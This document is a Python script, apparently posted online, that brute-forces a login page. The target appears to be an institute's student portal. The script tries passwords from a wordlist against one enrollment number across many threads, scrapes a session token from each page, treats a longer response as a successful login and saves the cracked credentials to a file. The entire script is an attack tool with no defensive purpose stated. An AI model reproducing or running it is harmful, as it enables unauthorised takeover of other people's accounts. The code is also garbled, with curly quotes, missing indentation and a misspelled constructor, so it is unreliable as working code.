import requests
import threading
import queue
import os
import time
import re

username = input("Enter the enrollment number of the user: ")
user_thread = input("Enter the no. of threads you want to use\n ~should be less than 100 for better performance}: “)
start_time = time.time()

password_list= open('password.txt’,’r’).readlines()
#Creating a queue
q=queue.Queue()
for password in password_list:
q.put(password)

target_url = "https://www.website.com/i***n/lo******e.jsp?m****=15730e1591c965c5f07acc9184ebbfc24570a448225f8f574b14259f785ccbb0"
target_post= "https://www.website.com/i***n/login.jsp"
#r = requests.get(target_url)

class WorkerThread(threading.Thread):
def _init_(self, tid):
threading.Thread._init_(self)
self.tid = tid
self.username = username

def run(self):
while True and not q.empty():
passwd = q.get()
print("[-]Trying Username: " + self.username + "with password : " + passwd)
try:
with requests.Session() as session:
#Payload Config here
payload = {'text1’:self.username, ‘text2’:passwd, ‘mtype’:’student’, ‘submit1’:’Go’}
#Getting post request link here
r = session.get(target_url)
var = re.findall("\?m**=(.*?)>Institute”, str(r.content))
target_post = "https://www.website.com/i***n/login.jsp" + “?m**=” + var[0]
#print(target_post)
#Sending another request with payload here
response = session.post(target_post, payload)
print(len(response.content))
#Checking for success here
#3497
if len(response.content)>3400:
print("\n — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — “)
print("|[+]Password Found — -> “ + passwd + “ Waiting for other threads to exit…”)
#Time format here
end_time = time.time()
hours, rem = divmod(end_time-start_time, 3600)
minutes, seconds = divmod(rem, 60)
print("Time Elapsed: {:0>2} hr:{:0>2} min:{:05.2f} sec”.format(int(hours),int(minutes),seconds))
#Writing credential to a file here
print("[+]Testing Complete…\n\n\n[+]Writing the credentials to the file…”)
f = open("credentials.txt”, “a+”)
credential = self.username + " — — — — — — → “ + passwd
f.write(credential)
f.close()
#Completion of program here
print("[+]Done Writing.\n[+] Exiting…”)
print(" — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -”)

os._exit(1)

except:
raise
os._exit(1)
#Getting failure in finding password here
print("\n — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — “)
print("[-]Password not found.\nTry changing the worlist.\nExiting…”)
end_time = time.time()
hours, rem = divmod(end_time-start_time, 3600)
minutes, seconds = divmod(rem, 60)
print("Time Elapsed: {:0>2} hr:{:0>2} min:{:05.2f} sec”.format(int(hours),int(minutes),seconds))
print("— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -”)
os._exit(1)

threads = []
for i in range(int(user_thread)):
worker = WorkerThread(i)
worker.setDaemon(True)
threads.append(worker)
worker.start()

q.join()
for item in threads:
item.join()